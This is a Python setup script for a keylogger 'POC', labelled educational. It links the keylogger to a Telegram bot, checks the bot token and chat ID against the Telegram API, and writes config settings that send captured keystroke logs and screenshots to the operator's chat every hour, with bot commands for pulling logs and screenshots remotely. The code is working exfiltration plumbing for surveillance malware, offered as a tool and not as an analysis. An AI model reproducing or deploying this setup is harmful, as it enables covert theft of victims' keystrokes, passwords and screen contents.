#!/usr/bin/env python3
"""
Telegram Bot Setup Script
Educational Purpose Only - Use Responsibly

This script helps configure Telegram bot integration for the keylogger.
"""

import os
import sys
import requests
from pathlib import Path
from configparser import ConfigParser

def print_header():
    """Print script header."""
    print("=" * 60)
    print("Keylogger POC - Telegram Bot Setup")
    print("Educational Purpose Only")
    print("=" * 60)
    print()

def get_bot_token():
    """Get bot token from user."""
    print("Step 1: Create a Telegram Bot")
    print("-" * 30)
    print("1. Open Telegram and search for @BotFather")
    print("2. Send /newbot command")
    print("3. Follow the instructions to create your bot")
    print("4. Copy the bot token provided by BotFather")
    print()
    
    while True:
        token = input("Enter your bot token: ").strip()
        if token:
            # Validate token format
            if ':' in token and len(token) > 20:
                return token
            else:
                print("Invalid token format. Please try again.")
        else:
            print("Token cannot be empty. Please try again.")

def get_chat_id(bot_token):
    """Get chat ID from user."""
    print("\nStep 2: Get Your Chat ID")
    print("-" * 25)
    print("1. Search for @userinfobot in Telegram")
    print("2. Send any message to the bot")
    print("3. Copy your Chat ID from the response")
    print()
    print("Alternative method:")
    print("1. Send a message to your bot")
    print("2. Visit: https://api.telegram.org/bot{}/getUpdates".format(bot_token))
    print("3. Look for 'chat':{'id': YOUR_CHAT_ID}")
    print()
    
    while True:
        chat_id = input("Enter your chat ID: ").strip()
        if chat_id:
            try:
                # Try to convert to int to validate
                int(chat_id)
                return chat_id
            except ValueError:
                print("Invalid chat ID format. Please enter a numeric ID.")
        else:
            print("Chat ID cannot be empty. Please try again.")

def test_bot_connection(bot_token, chat_id):
    """Test bot connection."""
    print("\nStep 3: Testing Bot Connection")
    print("-" * 32)
    
    try:
        # Test bot info
        url = f"https://api.telegram.org/bot{bot_token}/getMe"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        
        bot_info = response.json()
        if not bot_info.get('ok'):
            print("❌ Bot token is invalid")
            return False
        
        bot_name = bot_info['result']['first_name']
        print(f"✅ Bot found: {bot_name}")
        
        # Test sending message
        message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': '🤖 Keylogger POC Bot Setup Test\n\nThis is a test message to verify the connection.'
        }
        
        response = requests.post(message_url, data=data, timeout=10)
        response.raise_for_status()
        
        result = response.json()
        if result.get('ok'):
            print("✅ Test message sent successfully")
            return True
        else:
            print(f"❌ Failed to send test message: {result.get('description', 'Unknown error')}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Connection error: {e}")
        return False
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        return False

def update_config(bot_token, chat_id):
    """Update configuration file."""
    print("\nStep 4: Updating Configuration")
    print("-" * 33)
    
    try:
        config_file = Path('config.ini')
        config = ConfigParser()
        
        # Load existing config or create new one
        if config_file.exists():
            config.read(config_file)
            print("✅ Existing configuration loaded")
        else:
            print("⚠️  Configuration file not found, creating new one")
        
        # Ensure TELEGRAM section exists
        if not config.has_section('TELEGRAM'):
            config.add_section('TELEGRAM')
        
        # Update Telegram settings
        config.set('TELEGRAM', 'enabled', 'true')
        config.set('TELEGRAM', 'bot_token', bot_token)
        config.set('TELEGRAM', 'chat_id', chat_id)
        config.set('TELEGRAM', 'send_interval', '3600')  # 1 hour
        config.set('TELEGRAM', 'max_file_size', '52428800')  # 50MB
        config.set('TELEGRAM', 'send_logs', 'true')
        config.set('TELEGRAM', 'send_screenshots', 'true')
        
        # Save configuration
        with open(config_file, 'w') as f:
            config.write(f)
        
        print("✅ Configuration updated successfully")
        return True
        
    except Exception as e:
        print(f"❌ Error updating configuration: {e}")
        return False

def show_usage_instructions():
    """Show usage instructions."""
    print("\nStep 5: Usage Instructions")
    print("-" * 26)
    print("Your Telegram bot is now configured!")
    print()
    print("Available bot commands:")
    print("  /status     - Get current keylogger status")
    print("  /logs       - Get recent log files")
    print("  /screenshots - Get recent screenshots")
    print("  /help       - Show help message")
    print()
    print("The bot will automatically send periodic updates every hour.")
    print("You can change the interval in config.ini (send_interval setting).")
    print()
    print("To start the keylogger with Telegram integration:")
    print("  python main.py")
    print()

def main():
    """Main function."""
    print_header()
    
    try:
        # Get bot token
        bot_token = get_bot_token()
        
        # Get chat ID
        chat_id = get_chat_id(bot_token)
        
        # Test connection
        if not test_bot_connection(bot_token, chat_id):
            print("\n❌ Bot setup failed. Please check your token and chat ID.")
            return 1
        
        # Update configuration
        if not update_config(bot_token, chat_id):
            print("\n❌ Failed to update configuration.")
            return 1
        
        # Show usage instructions
        show_usage_instructions()
        
        print("=" * 60)
        print("Telegram bot setup completed successfully!")
        print("=" * 60)
        
        return 0
        
    except KeyboardInterrupt:
        print("\n\nSetup cancelled by user.")
        return 1
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())

